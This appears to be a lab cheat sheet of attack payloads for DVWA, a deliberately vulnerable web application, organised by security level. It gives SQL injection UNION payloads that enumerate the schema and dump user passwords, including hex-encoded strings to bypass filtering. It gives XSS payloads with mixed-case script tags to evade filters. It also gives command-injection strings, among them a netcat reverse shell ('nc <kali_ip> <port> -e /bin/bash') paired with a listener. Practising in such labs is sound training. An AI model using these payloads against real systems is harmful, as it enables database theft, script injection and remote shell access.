# SQL injection
<h3>low security level</h3>

- To find all tables, from a database called “dvwa”: 
`1' UNION SELECT table_name,null FROM information_schema.tables WHERE table_schema = 'dvwa'#`

 - To find all columns, from the database called “dvwa”: `1' UNION SELECT column_name,null FROM information_schema.columns WHERE table_schema ='dvwa'#`

 - To find all column names of the table named “users”, from a database called “dvwa”: `1' UNION SELECT column_name,null FROM information_schema.columns WHERE table_name = 'users' AND table_schema = 'dvwa'#`

 - To get the content of one column of the table named “users”, from a database called “dvwa”: `1' UNION SELECT password,null FROM dvwa.users#`
<h3>medium security level</h3>
 
 - To find all tables, from a database called “dvwa”: `1 union select table_name,null from information_schema.tables where table_schema = 0x64767761`
 - Note: `0x64767761` is DB name `dvwa` but decoded to hex u can use this website for decoding : https://cryptii.com/pipes/hex-decoder
 
 - To find all columns, from the database called “dvwa”: `1 UNION SELECT column_name,null FROM information_schema.columns WHERE table_schema = 0x64767761`

 - To find all column names of the table named “users”, from a database called “dvwa”: `1 UNION SELECT column_name,null FROM information_schema.columns WHERE table_name = 0x7573657273 AND table_schema = 0x64767761`

 - To get the content of one column of the table named “users”, from a database called “dvwa”: `1 UNION SELECT password,null FROM dvwa.users`

# XSS
<h3>low security level</h3>

- To reflect on the screen your name using reflected / stored XSS: `<script>alert('$YOUR_NAME')</script>`

<h3>medium security level</h3>

- To reflect on the screen your name using reflected / stored XSS: `<sCript>alert('$YOUR_NAME')</Script>`
- Note: use uppercase in the word `<script>` to ignore website filtering

# Command Execution 
<h3>low security level</h3>

- To show the Path: `; pwd`
- To show the list of files and directories: `; ls -la`
- First run in terminal: `nc -lvp <port>`
- To connect remotely with the kali-Linux using netcat nc in DVWA: `; nc <kali_ip> <port> -e /bin/bash`
- Note: u can get your `kali_ip` from writing in terminal: `ifconfig`
 => then u will get your kali ip: `inet <kail_ip>`
<h3>medium security level</h3>

- To show the Path: `| pwd`
- To show the list of files and directories: `| ls -la`
- First run in terminal: `nc -lvp <port>`
- To connect remotely with the kali-Linux using netcat nc in DVWA: `| nc <kali_ip> <port> -e /bin/bash`
